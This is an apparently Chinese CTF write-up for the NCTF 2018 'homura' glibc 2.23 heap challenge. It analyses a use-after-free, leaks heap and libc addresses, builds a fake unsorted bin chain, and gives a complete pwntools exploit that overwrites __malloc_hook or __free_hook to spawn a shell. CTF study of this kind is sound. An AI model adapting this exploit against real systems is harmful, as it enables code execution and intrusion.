+<p>这个题目是 glibc2.23 ，在 glibc2.23 中连 check(victim-&gt;bk-&gt;fd == victim) 都没，而每次将链表中 chunk 拿出来之后，是用 unsorted_bins(av)-&gt;bk 遍历整个双向链表，即使双向链表中 fd 除 unsorted_bins(av)-&gt;fd 以外都是错误的，如果 unsorted_bins(av)-&gt;bk 的 fd 是指向 main_arena+88 的位置的，遍历 unsorted bins 的双向链表时，victim-&gt;bk-&gt;fd 每次都是被动被赋值成 unsorted_bins(av)-&gt;fd ，因此一层一层遍历下来， fd 都会被赋值成相同的值<br/></p>
+<p>（虽然我还是想默默吐槽一下，NCTF 2018 这题官方 exp 写的毫无注解，但是还是很巧妙的，这一题 unsorted bin 的攻击方式，确实在 Google 中没有搜出来[搜到最后，再搜的时候，Google 一个版面都显示你全看过]，不得已最后去调试了一发官方 exp [最后感觉官方 exp 还是写复杂了，不过已经很良心了，一些比赛连 exp 都没]）<br/></p>
+<h3 id="_2">功能<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<h4 id="add">add()<a class="headerlink" href="#add" title="Permanent link">&para;</a></h4>
+<p>每一次 add() 都会产生三个 chunk <br/>
+先 malloc(0x10) 用来管理之后 malloc 的两个 chunk <br/>
+<div class="codehilite"><pre><span></span>struct P
+{
+    char* name;
+    char* message;
+}
+</pre></div>
+之后两个 chunk 限制大小，name 最大 malloc(0x10)，message 最小 malloc(0x80+0x10) <br/></p>
+<div class="codehilite"><pre><span></span>void add()
+{
+  struct P *v0; // rbx
+  struct P *v1; // rbx
+  signed int i; // [rsp+4h] [rbp-1Ch]
+  int v3; // [rsp+8h] [rbp-18h]
+  int v4; // [rsp+Ch] [rbp-14h]
+
+  for ( i = 0; i &lt;= 14 &amp;&amp; Array[i]; ++i )
+    ;
+  if ( i &lt;= 14 )
+  {
+    Array[i] = (struct P *)malloc(0x10uLL);
+    v0 = Array[i];
+    v0-&gt;name = (char *)malloc(0x10uLL);
+    printf(&quot;length of your name:&quot;);
+    v3 = Atoi();
+    if ( v3 &gt; 15 )
+      v3 = 16;
+    printf(&quot;your name:&quot;);
+    Read(Array[i]-&gt;name, v3);
+    printf(&quot;size of your message:&quot;, (unsigned int)v3);
+    v4 = Atoi();
+    if ( v4 &lt;= 0x80 || v4 &gt; 0xFFF )
+      v4 = 0x80;
+    v1 = Array[i];
+    v1-&gt;message = (char *)malloc(v4 + 16);
+    printf(&quot;please leave your message:&quot;);
+    Read(Array[i]-&gt;message, v4);
+    puts(&quot;Done!&quot;);
+  }
+  else
+  {
+    puts(&quot;full!&quot;);
+  }
+}
+</pre></div>
+
+<h4 id="delete">delete()<a class="headerlink" href="#delete" title="Permanent link">&para;</a></h4>
+<p>删除的时候，会清空 Arrray[v0]，但是没清空 struct P 中两个指针（UAF）
+<div class="codehilite"><pre><span></span>void delete()
+{
+  int v0; // [rsp+Ch] [rbp-4h]
+
+  printf(&quot;index:&quot;);
+  v0 = Atoi();
+  if ( v0 &gt;= 0 &amp;&amp; v0 &lt;= 14 )
+  {
+    free(Array[v0]-&gt;name);
+    free(Array[v0]-&gt;message);
+    free(Array[v0]);
+    Array[v0] = 0LL;
+    puts(&quot;Done!&quot;);
+  }
+  else
+  {
+    puts(&quot;invalid&quot;);
+  }
+}
+</pre></div></p>
+<h4 id="modify">modify()<a class="headerlink" href="#modify" title="Permanent link">&para;</a></h4>
+<p>漏洞就出在这里，唯一可以打印的地方，以及唯一可以修改的地方（其实不是唯一可以修改的地方）<br/>
+可以想到，如果在 delete() 之前 modify() 了，那么该 struct P 指针就会被记录在 qword_2020E0 这个位置，又因为 delete 之后可以 UAF，所以能更改被 free 之后 message 那一块的值，同样因为 UAF，即将被 malloc 块的（不包含头的）前8个字节上面有值，即原来残留的 fd ，然后在 add 的时候，输入空（""）那么就能泄露 heap base 和 libc base ，一个通过 fastbin 的 fd 泄露，一个通过 unsorted bin 的 fd 泄露 libc <br/></p>
+<p>对于被 free 掉的 unsorted bin 可以更改 fd bk 形成 fake unsorted bin 链 <br/>
+<div class="codehilite"><pre><span></span>void modify()
+{
+  int v0; // [rsp+8h] [rbp-18h]
+  int v1; // [rsp+Ch] [rbp-14h]
+
+  printf(&quot;index:&quot;);
+  v1 = Atoi();
+  if ( v1 &gt;= 0 &amp;&amp; v1 &lt;= 14 )
+  {
+    if ( Array[v1] )
+      qword_2020E0 = Array[v1];
+    if ( qword_2020E0 )
+    {
+      printf(&quot;size:&quot;);
+      v0 = Atoi();
+      if ( v0 &gt; strlen(qword_2020E0-&gt;message) )
+        v0 = 16;
+      printf(&quot;Hello %s you can modify your message &gt;&quot;, qword_2020E0-&gt;name);
+      Read(qword_2020E0-&gt;message, v0);
+      puts(&quot;Done!&quot;);
+    }
+  }
+  else
+  {
+    puts(&quot;invalid&quot;);
+  }
+}
+</pre></div></p>
+<h4 id="edit_len_0">edit_len_0<a class="headerlink" href="#edit_len_0" title="Permanent link">&para;</a></h4>
+<p>modify 跟 edit_len_0 最大的区别就是，modify 根据 strlen(message) 再次输入，而 edit_len_0 可以在 len = 0 时，进行复写
+<div class="codehilite"><pre><span></span>void edit_len_0()
+{
+  int v0; // [rsp+Ch] [rbp-34h]
+  char s; // [rsp+10h] [rbp-30h]
+  __int64 v2; // [rsp+28h] [rbp-18h]
+  unsigned __int64 v3; // [rsp+38h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  if ( vuln_argv == 0xDEADBEEF )
+  {
+    vuln_argv = 0;
+    printf(&quot;index:&quot;);
+    v0 = Atoi();
+    if ( v0 &gt;= 0 &amp;&amp; v0 &lt;= 14 )
+    {
+      if ( Array[v0] )
+        qword_2020E0 = Array[v0];
+      if ( qword_2020E0 )
+      {
+        printf(&quot;modify your message&gt;&quot;);
+        memset(&amp;s, 0, 0x28uLL);
+        Read(&amp;s, 8u);
+        printf(&quot;Here you can modify once again!&gt;&quot;, 8LL);
+        Read((char *)&amp;v2, 8u);
+        memcpy(qword_2020E0-&gt;message, &amp;s, 0x20uLL);
+        puts(&quot;Done!&quot;);
+      }
+    }
+    else
+    {
+      puts(&quot;invalid&quot;);
+    }
+  }
+}
+</pre></div></p>
+<h3 id="_3">分析<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<h4 id="leak-heap-libc">leak heap &amp; libc<a class="headerlink" href="#leak-heap-libc" title="Permanent link">&para;</a></h4>
+<p>add() 三次 chunk : 0x20 0x20 0xa0 | 0x20 0x20 0xa0 | 0x20 0x20 0xa0 然后 delete(1) delete(0) 再 add() 的时候，name = "" 通过 modify() 打印，泄露出 heap base <br/>
+libc 则通过先 add() 一个大块，然后 delete() 之后，add() 小块，小块会切分大块 unsorted bin ，从而 leak libc
+<div class="codehilite"><pre><span></span>log.info(&quot;leak heap&quot;)
+add(0x10, &quot;A&quot;*0xF, 0x80, &quot;a&quot;*0x20)  # 0
+add(0x10, &quot;B&quot;*0xF, 0x80, &quot;b&quot;*0x20)  # 1
+add(0x10, &quot;C&quot;*0xF, 0x80, &quot;c&quot;*0x20)  # 2
+modify(0, 0x21, &quot;a&quot;*0x20)
+
+delete(1)
+delete(0)
+add(0, &quot;&quot;, 0, &quot;&quot;)
+heap_base = leak(0, 0, &quot;&quot;) - 0xe0
+success(&quot;heap&quot;, heap_base)
+pause()
+
+log.info(&quot;leak libc&quot;)
+add(0x10, &quot;D&quot;*0xF, 0x80, &quot;d&quot;*0x20)  # 1
+add(0x10, &quot;E&quot;*0xF, (0xa0+0x20+0xa0), &quot;e&quot;*0x20) # 3
+add(0x10, &quot;F&quot;*0xF, 0x80, &quot;f&quot;*0x20)  # 4
+delete(3)
+add(0, &quot;&quot;, 0, &quot;&quot;)                   # 5
+add(0, &quot;&quot;, 0, &quot;&quot;)                   # 6
+libc.address = leak(5, 0, &quot;&quot;) - 88 - 0x3c4b20
+success(&quot;libc&quot;, libc.address)
+pause()
+</pre></div></p>
+<h4 id="fake-unsorted-bin">构造 fake unsorted bin 链<a class="headerlink" href="#fake-unsorted-bin" title="Permanent link">&para;</a></h4>
+<p>如果最后能把一个 P 中指向 message 的指针变成自己可控，岂不美哉。这一个利用手法实在太强了[到了 libc2.27 就等着死吧 orz <br/></p>
+<p>在官方的 exp 中通过设计，将一个正在使用的 name 的块，放入了unsorted bin 链中，然后通过 unsorted bin 的 sort 的机制，被放入了 small bins 中，一个 name 的 chunk 即将变成另一个 add() 中的 struct P 想想就激动 <br/></p>
+<p>想想需要满足些什么条件，最起码 bk 的链需要循环，fd 的链则不用，unsorted_bins(av)-&gt;bk 的 fd 必须是 main_arena+88 ，对于 unsorted_bins(av)-&gt;bk 必须指向需要构造链的最下面那个 chunk 。不妨将 unsorted_bins(av) 的|fd bk| 看成一个chunk, chunk A， unsorted bins 链中间一块看成 chunk B，unsorted_bins(av)-&gt;bk 看成 chunk C <br/></p>
+<p>目标：
+<div class="codehilite"><pre><span></span>unsorted bins A &lt;=&gt; B &lt;=&gt; C
+A.bk == C 
+C.bk == B
+B.bk == A (main_arena+88)
+C.fd == A (main_arena+88)
+</pre></div>
+最难处理的地方在于，我们需要让 name 的那个 chunk 比 正规的 unsorted bins 先出去，否则 name 那个 chunk 会因为 unosrted bins 的机制不能被 sort 出去，那么 unsorted bins (av)-&gt;bk == fake (name chunk) ，但是在 unsorted bins 的 malloc 的时候，将 unsorted_bins (av)-&gt;bk 这个 chunk 的 bk 值改变，unsorted_bins (av) 的 bk 值也就能变了，所以 伪造一个 unsorted_bins (av)-&gt;bk 的假 bk 值。</p>
+<p>exp :
+<div class="codehilite"><pre><span></span>main_arena = libc.address + 0x3c4b20
+system = libc.sym[&#39;system&#39;]
+__malloc_hook = libc.sym[&#39;__malloc_hook&#39;]
+__free_hook = libc.sym[&#39;__free_hook&#39;]
+#  one_gadget = libc.address + 0xf02a4 / 0xf1147  both can get shell
+one_gadget = libc.address + 0xf1147
+
+log.info(&quot;hijack unsorted bin&quot;)
+delete(5)
+modify(5, 0x20, p64(heap_base+0x20)*2)
+add(0x10, &quot;G&quot;*0xF, 0x80, p64(main_arena+88)*4)
+modify(0, 0x20, &quot;\x90&quot;*0x20)
+delete(0)
+add(0x10, p64(main_arena+88)+p64(heap_base+0x120), 0x80, p64(main_arena+88)*4)
+</pre></div></p>
+<h5 id="gdb">gdb 调试<a class="headerlink" href="#gdb" title="Permanent link">&para;</a></h5>
+<h6 id="delete5-modify">delete(5) &amp; modify()<a class="headerlink" href="#delete5-modify" title="Permanent link">&para;</a></h6>
+<div class="codehilite"><pre><span></span>pwndbg&gt; parseheap
+addr                prev                size                 status              fd                bk                
+0x55c846963000      0x0                 0x20                 Used                None              None
+0x55c846963020      0x0                 0x20                 Used                None              None
+0x55c846963040      0x0                 0xa0                 Used                None              None
+0x55c8469630e0      0xa0                0x20                 Used                None              None
+0x55c846963100      0x0                 0x20                 Used                None              None
+0x55c846963120      0x0                 0xa0                 Used                None              None
+0x55c8469631c0      0xa0                0x20                 Used                None              None
+0x55c8469631e0      0x0                 0x20                 Used                None              None
+0x55c846963200      0x0                 0xa0                 Used                None              None
+0x55c8469632a0      0x0                 0x20                 Used                None              None
+0x55c8469632c0      0x0                 0x20                 Used                None              None
+0x55c8469632e0      0x0                 0xa0                 Used                None              None
+0x55c846963380      0x0                 0x20                 Freed     0x55c8469633a0              None
+0x55c8469633a0      0x0                 0x20                 Freed                0x0              None
+0x55c8469633c0      0x0                 0xa0                 Freed     0x7fa141c14b78    0x7fa141c14b78
+0x55c846963460      0xa0                0x20                 Used                None              None
+0x55c846963480      0x0                 0x20                 Used                None              None
+0x55c8469634a0      0x0                 0xa0                 Used                None              None
+
+0x55c8469633c0      0x0                 0xa0                 Freed     0x55c846963020    0x55c846963020
+</pre></div>
+
+<h6 id="add-modify0">add() &amp; modify(0)<a class="headerlink" href="#add-modify0" title="Permanent link">&para;</a></h6>
+<p>modify(0) 仅仅是为了让 0x2020E0 记录 Array[0]
+<div class="codehilite"><pre><span></span>pwndbg&gt; p main_arena
+$1 = {
+  mutex = 0,
+  flags = 0,
+  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
+  top = 0x55c846963540,
+  last_remainder = 0x55c8469633c0,
+  bins = {0x55c8469633c0, 0x55c846963020, 0x7fa141c14b88 &lt;main_arena+104&gt;, 0x7fa141c14b88 &lt;main_arena+104&gt;, 0x7fa141c14b98 &lt;main_arena+120&gt;, 0x7fa141c14b98 &lt;main_arena+120&gt;, 0x7fa141c14ba8 &lt;main_arena+136&gt;, 0x7fa141c14ba8 &lt;main_arena+136&gt;, 0x7fa141c14bb8 &lt;main_arena+152&gt;, 0x7fa141c14bb8 &lt;main_arena+152&gt;, 0x7fa141c14bc8 &lt;main_arena+168&gt;, 0x7fa141c14bc8 &lt;main_arena+168&gt;, 0x7fa141c14bd8 &lt;main_arena+184&gt;, 0x7fa141c14bd8 &lt;main_arena+184&gt;, 0x7fa141c14be8 &lt;main_arena+200&gt;...},
+  binmap = {16777216, 0, 0, 0},
+  next = 0x7fa141c14b20 &lt;main_arena&gt;,
+  next_free = 0x0,
+  attached_threads = 1,
+  system_mem = 135168,
+  max_system_mem = 135168
+}
+</pre></div></p>
+<h6 id="delete0-add0x10-p64main_arena88p64heap_base0x120-0x80-p64main_arena884">delete(0) &amp; add(0x10, p64(main_arena+88)+p64(heap_base+0x120), 0x80, p64(main_arena+88)*4)<a class="headerlink" href="#delete0-add0x10-p64main_arena88p64heap_base0x120-0x80-p64main_arena884" title="Permanent link">&para;</a></h6>
+<p>进行 unsorted bin bk 的循环闭合 <br/>
+这个地方我没下断点下好，讲一下为什么到了这一步吧，在 add() 中， malloc(0x10) 之后 malloc(0x10) ，这个就是 heap_base + 0x20 即 上面讲的 chunk C <br/>
+在遍历 unsorted bins 时，会先将 0x20 拿出来，再把 unsorted bins 拿出来
+<div class="codehilite"><pre><span></span>unsorted_bins(av)-&gt;bk = (0x20)
+(0x20).fd = unsorted_bins(av) / main_arena+88
+(0x20).bk = (0x120)
+(0x120).bk = unsorted_bins(av) / main_arena+88
+(0x120).fd = unsorted_bins(av) / main_arena+88
+</pre></div>
+<div class="codehilite"><pre><span></span>pwndbg&gt; parseheap
+addr                prev                size                 status              fd                bk                
+0x55c846963000      0x0                 0x20                 Freed     0x55c846963020              None
+0x55c846963020      0x0                 0x20                 Freed                0x0              None
+0x55c846963040      0x0                 0xa0                 Used                None              None
+0x55c8469630e0      0xa0                0x20                 Used                None              None
+0x55c846963100      0x0                 0x20                 Used                None              None
+0x55c846963120      0x0                 0xa0                 Freed     0x55c8469633c0    0x7fa141c14b78
+</pre></div></p>
+<p>神奇的现象发生了
+<div class="codehilite"><pre><span></span>pwndbg&gt; heapinfo
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x55c846963540 (size : 0x20ac0)
+       last_remainder: 0x55c8469633c0 (size : 0xa0)
+            unsortbin: 0x0
+(0x020)  smallbin[ 0]: 0x55c846963020
+</pre></div></p>
+<p>开开心心</p>
+<h4 id="hijack">hijack<a class="headerlink" href="#hijack" title="Permanent link">&para;</a></h4>
+<p>我试了两种，一种 hijack <code>__malloc_hook =&gt; one_gadget</code> 另外一种 <code>__free_hook =&gt; system</code>，都可行</p>
+<h5 id="exp1">exp1<a class="headerlink" href="#exp1" title="Permanent link">&para;</a></h5>
+<div class="codehilite"><pre><span></span>#  one_gadget = libc.address + 0xf02a4 / 0xf1147  both can get shell
+one_gadget = libc.address + 0xf1147
+
+
+# exp 1 : hijack __malloc_hook =&gt; one_gadget
+log.info(&quot;last step : hijack __malloc_hook =&gt; one_gadget&quot;)
+add(0x10, &quot;1&quot;*0x10, 0x80, &quot;1&quot;*0x20)
+delete(0)
+add(0x10, p64(__malloc_hook)*2, 0x80, &quot;get shell&quot;)
+edit_len_0(6, p64(one_gadget), p64(one_gadget))
+pause()
+
+log.info(&quot;Get shell&quot;)
+io.sendlineafter(&quot;&gt;&gt;&quot;, &quot;1&quot;)
+</pre></div>
+
+<h5 id="exp2">exp2<a class="headerlink" href="#exp2" title="Permanent link">&para;</a></h5>
+<div class="codehilite"><pre><span></span># exp 2 : hijack __free_hook =&gt; system
+log.info(&quot;last step : hijack __free_hook =&gt; system&quot;)
+add(0x10, &quot;1&quot;*0x20, 0x80, &quot;/bin/sh\x00&quot;)
+delete(0)
+add(0x10, &quot;/bin/sh\x00&quot; + p64(__free_hook), 0x80, &quot;/bin/sh\x00&quot;)
+edit_len_0(6, p64(system), p64(system))
+pause()
+
+log.info(&quot;Get shell&quot;)
+delete(0)
+</pre></div>
+
+<h3 id="exp">完整 exp<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+from pwn import *
+from time import sleep
+import os
+import sys
+
+elfPath = &quot;./homura&quot;
+libcPath = &quot;./libc-2.23.so&quot;
+Addr = &quot;&quot;
+Port = 0
+
+context.log_level = &quot;debug&quot;
+context.binary = elfPath
+
+elf = context.binary
+if sys.argv[1] == &quot;l&quot;:
+    io = process(elfPath)
+    libc = elf.libc
+
+else:
+    if sys.argv[1] == &quot;d&quot;:
+        io = process(elfPath, env = {&quot;LD_PRELOAD&quot;: libcPath})
+        context.log_level = &quot;info&quot;
+    else :
+        io = remote(Addr, Port)
+        context.log_level = &quot;info&quot;
+    if libcPath:
+        libc = ELF(libcPath)
+
+success = lambda name, value: log.success(&quot;{} -&gt; {:#x}&quot;.format(name, value))
+
+def add(lenth, name, size, message):
+    io.sendlineafter(&quot;&gt;&gt;&quot;, &quot;1&quot;)
+    io.sendlineafter(&quot;name:&quot;, str(int(lenth)))
+    if lenth != 0:
+        io.sendlineafter(&quot;name:&quot;, name)
+    io.sendlineafter(&quot;message:&quot;, str(int(size)))
+    io.sendlineafter(&quot;message:&quot;, message)
+
+def delete(idx):
+    io.sendlineafter(&quot;&gt;&gt;&quot;, &quot;2&quot;)
+    io.sendlineafter(&quot;index:&quot;, str(idx))
+
+def modify(idx, size, message):
+    io.sendlineafter(&quot;&gt;&gt;&quot;, &quot;3&quot;)
+    io.sendlineafter(&quot;index:&quot;, str(idx))
+    io.sendlineafter(&quot;size:&quot;, str(int(size)))
+    if size != 0:
+        io.sendlineafter(&quot;&gt;&quot;, message)
+
+def leak(idx, size, message):
+    io.sendlineafter(&quot;&gt;&gt;&quot;, &quot;3&quot;)
+    io.sendlineafter(&quot;index:&quot;, str(idx))
+    io.sendlineafter(&quot;size:&quot;, str(int(size)))
+    io.recvuntil(&quot;\x20&quot;)
+    value = u64(io.recvuntil(&quot;\x20&quot;, drop=True).ljust(8, &quot;\x00&quot;))
+    if size != 0:
+        io.sendlineafter(&quot;&gt;&quot;, message)
+    return value
+
+
+def edit_len_0(idx, s, v2):
+    io.sendlineafter(&quot;&gt;&gt;&quot;, &quot;5&quot;)
+    io.sendlineafter(&quot;index:&quot;, str(idx))
+    io.sendlineafter(&quot;message&gt;&quot;, s)
+    io.sendlineafter(&quot;!&gt;&quot;, v2)
+
+
+if __name__ == &quot;__main__&quot;:
+    &#39;&#39;&#39;
+    [*] Test case 5:
+    pause()
+    add(0x10, &quot;A&quot;*0xF, 0x80, &quot;a&quot;*0x20)
+    vuln(0, &quot;B&quot;*0x7, &quot;b&quot;*0x1F)
+    &#39;&#39;&#39;
+
+    log.info(&quot;leak heap&quot;)
+    add(0x10, &quot;A&quot;*0xF, 0x80, &quot;a&quot;*0x20)  # 0
+    add(0x10, &quot;B&quot;*0xF, 0x80, &quot;b&quot;*0x20)  # 1
+    add(0x10, &quot;C&quot;*0xF, 0x80, &quot;c&quot;*0x20)  # 2
+    modify(0, 0x21, &quot;a&quot;*0x20)
+
+    delete(1)
+    delete(0)
+    add(0, &quot;&quot;, 0, &quot;&quot;)
+    heap_base = leak(0, 0, &quot;&quot;) - 0xe0
+    success(&quot;heap&quot;, heap_base)
+    pause()
+
+    log.info(&quot;leak libc&quot;)
+    add(0x10, &quot;D&quot;*0xF, 0x80, &quot;d&quot;*0x20)  # 1
+    add(0x10, &quot;E&quot;*0xF, (0xa0+0x20+0xa0), &quot;e&quot;*0x20) # 3
+    add(0x10, &quot;F&quot;*0xF, 0x80, &quot;f&quot;*0x20)  # 4
+    delete(3)
+    add(0, &quot;&quot;, 0, &quot;&quot;)                   # 5
+    add(0, &quot;&quot;, 0, &quot;&quot;)                   # 6
+    libc.address = leak(5, 0, &quot;&quot;) - 88 - 0x3c4b20
+    success(&quot;libc&quot;, libc.address)
+    pause()
+
+    # log.info(&quot;hijack global_max_fast&quot;)
+    # global_max_fast 0x7f6c5d5b87f8
+    # libc 0x7f6c5d1f2000
+    # global_max_fast = libc.address + 0x3c67f8
+    # _IO_list_all = libc.sym[&#39;_IO_list_all&#39;]
+    &#39;&#39;&#39;
+0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+    &#39;&#39;&#39;
+    main_arena = libc.address + 0x3c4b20
+    system = libc.sym[&#39;system&#39;]
+    __malloc_hook = libc.sym[&#39;__malloc_hook&#39;]
+    __free_hook = libc.sym[&#39;__free_hook&#39;]
+    #  one_gadget = libc.address + 0xf02a4 / 0xf1147  both can get shell
+    one_gadget = libc.address + 0xf1147
+
+    log.info(&quot;hijack unsorted bin&quot;)
+    delete(5)
+    modify(5, 0x20, p64(heap_base+0x20)*2)
+    add(0x10, &quot;G&quot;*0xF, 0x80, p64(main_arena+88)*4)
+    modify(0, 0x20, &quot;\x90&quot;*0x20)
+    delete(0)
+    add(0x10, p64(main_arena+88)+p64(heap_base+0x120), 0x80, p64(main_arena+88)*4)
+
+    &#39;&#39;&#39;
+    # exp 1 : hijack __malloc_hook =&gt; one_gadget
+    log.info(&quot;last step : hijack __malloc_hook =&gt; one_gadget&quot;)
+    add(0x10, &quot;1&quot;*0x10, 0x80, &quot;1&quot;*0x20)
+    delete(0)
+    add(0x10, p64(__malloc_hook)*2, 0x80, &quot;get shell&quot;)
+    edit_len_0(6, p64(one_gadget), p64(one_gadget))
+    pause()
+
+    log.info(&quot;Get shell&quot;)
+    io.sendlineafter(&quot;&gt;&gt;&quot;, &quot;1&quot;)
+    &#39;&#39;&#39;
+
+    # exp 2 : hijack __free_hook =&gt; system
+    log.info(&quot;last step : hijack __free_hook =&gt; system&quot;)
+    add(0x10, &quot;1&quot;*0x20, 0x80, &quot;/bin/sh\x00&quot;)
+    delete(0)
+    add(0x10, &quot;/bin/sh\x00&quot; + p64(__free_hook), 0x80, &quot;/bin/sh\x00&quot;)
+    edit_len_0(6, p64(system), p64(system))
+    pause()
+
+    log.info(&quot;Get shell&quot;)
+    delete(0)
+
+    io.interactive()
+    io.close()
+</pre></div>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../syscall/" title="syscall" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  后退
+                </span>
+                syscall
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../IDApython/" title="IDA IDApython" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  前进
+                </span>
+                IDA IDApython
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/application.2ba8dec4.js"></script>
+      
+        
+        
+          
+          <script src="../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
+          
+            
+              
+                <script src="../../assets/javascripts/lunr/tinyseg.js"></script>
+              
+              
+                <script src="../../assets/javascripts/lunr/lunr.ja.js"></script>
+              
+            
+          
+          
+        
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+    
+  </body>
+</html>
